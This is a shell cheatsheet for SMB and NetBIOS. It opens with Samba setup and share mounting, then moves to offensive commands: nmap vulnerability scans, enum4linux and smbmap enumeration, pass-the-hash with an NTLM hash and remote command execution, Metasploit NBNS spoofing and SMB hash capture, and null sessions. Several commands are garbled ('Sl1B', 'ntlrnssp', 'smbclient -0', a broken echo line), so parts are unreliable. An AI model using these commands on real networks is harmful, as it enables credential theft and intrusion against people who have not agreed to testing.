#!/bin/sh
##-======================================-##
##   [+] Xe1phix-[SMB]-Cheatsheet.sh
##-======================================-##


smb:// ip /share                            ## Access windows smb share
share user x.x.x.x c$                       ## Mount Windows share
smbclient -0 user\\\\ ip \\ share           ## Sl1B connect

/var/log/messages | grep DHCP               ## List DHCP assignments
echo "1" /proc/sys/net/ipv4/ip forward      ## Turn on IP Forwarding

scp /tmp/$File user@x.x.x.x:/tmp/$File        ## Put file
scp user@ remoteip :/tmp/$File /tmp/$File     Get file




##-====================================-##
##   [+] Service Message Block (SMB)
##-====================================-##
systemctl enable smb
systemctl start 
systemctl status smb



##-=============================-##
##  [+] 
##-=============================-##
smbclient -L\\ -N -I $IP
smbclient -L //localhost -U $User


##-================================-##
##  [+] Provide the target host:	
##-================================-##
smbclient -L\\ -N -I $1 2>&1 | tee "smbclient_$1.txt"


##-================================-##
##  [+] Mount SMB/CIFS shares
##-================================-##
mount.cifs // ip /share /mnt/share -o user=$User,pass=$Pass,sec=ntlrnssp,domain=$Domain,rw


mount -t cifs -o username=$User,password=$Pass //serverip/share_name /mnt/mountlocation

/etc/fstab
//serverip/share_name /mnt/mountlocation cifs username=$User,password=$Pass 0 0


##-====================================-##
##  [+] Mount Remote Windows Share:
##-====================================-##
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=$User,password=$Pass,rw



##-=============================-##
##  [+] 
##-=============================-##
## Samba file share on the Samba server, 
## the one client user is added to the tdbsam user database 

smbpasswd -a $User



##-=========================================================-##
##  [?] user accounts are displayed using a short listing

pdbedit -L



##-==========================-##
## -------------------------- ##
##   [+] SMB Enumeration
## -------------------------- ##
##-==========================-##



##-==========================-##
##   [+] SMB OS Discovery  
##-==========================-##
nmap $ip --script smb-os-discovery.nse

##-==========================-##
##   [+] Nmap port scan  
##-==========================-##
nmap -v -p 139,445 -oG $File.txt $IP-254

##-======================================-##
##   [+] Netbios Information Scanning 
##-======================================-##
nbtscan -r $IP/24               ## Netbios Information Scanning 

##-=====================================================-##
##   [+] Netbios Scan - Tee Output To Console +_File:
##-=====================================================-##
nbtscan -rvh $IP 2>&1 | tee "nbtscan-$IP.txt"


##-===========================================-##
##   [+] Nmap find exposed Netbios servers  
##-===========================================-##
nmap -sU --script nbstat.nse -p 137 $IP
        
##-======================================-##
##   [+] Nmap all SMB scripts scan
##-======================================-##
nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script args=unsafe=1 $IP

##-=================================================-##
##   [+] Nmap all SMB scripts authenticated scan
##-=================================================-##
nmap -sV -Pn -vv -p 445 --script-args smbuser=$User,smbpass=$Pass --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip







##-==================================-##
##   [+] SMB Enumeration Tools  
##-==================================-##
nmblookup -A $IP  
        
smbclient //MOUNT/share -I $IP -N  
        
rpcclient -U "" $IP  
        
enum4linux $IP  
enum4linux -a $IP						## Do all simple enumeration
smbtree -NS 2>/dev/null					## smb network browser

smbgetserverinfo -v -i $IP
smbdumpusers -i $IP



smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'

##-===============================-##
##   [+] SMB Finger Printing  
##-===============================-##
smbclient -L //$IP

##-======================================-##
##   [+] Nmap Scan for Open SMB Shares  
##-======================================-##
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=$User,smbpass=$Pass -p445 192.168.10.0/24

##-================================================-##
##   [+] Nmap scans for vulnerable SMB Servers 
##-================================================-##
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $IP


nmap --script="+*smb* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln $ip



##-==============================-##
##   [+] NBNS Spoof / Capture
##-==============================-##

##-=====================-##
##   [+] NBNS Spoof
##-=====================-##
msf > use auxiliary/spoof/nbns/nbns_response
msf auxiliary(nbns_response) > show options
msf auxiliary(nbns_response) > set INTERFACE eth0
msf auxiliary(nbns_response) > set SPOOFIP 10.10.10.10
msf auxiliary(nbns_response) > run


##-=====================-##
##   [+] SMB Capture
##-=====================-##
msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > set JOHNPWFILE /tmp/john_smb
msf auxiliary(smb) > run



##-==================================================-##
##   [+] Search The NMap Directory For SMB Scripts
##-==================================================-##
ls /usr/share/nmap/scripts/* | grep smb



##-===============================-##
##   [+] Netbios Enumeration
##-===============================-##
nbtscan -r $IP/24								## Netbios Information Scanning 
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt


##-===================================-##
##   [+] Null Session in Windows
##-===================================-##
net use \\192.168.0.1\IPC$ "" /u:""

##-================================-##
##   [+] Null Session in Linux
##-================================-##
smbclient -L //192.168.99.131

smbclient -L=10.0.2.15
smbclient \\\\10.0.2.15\\tmp



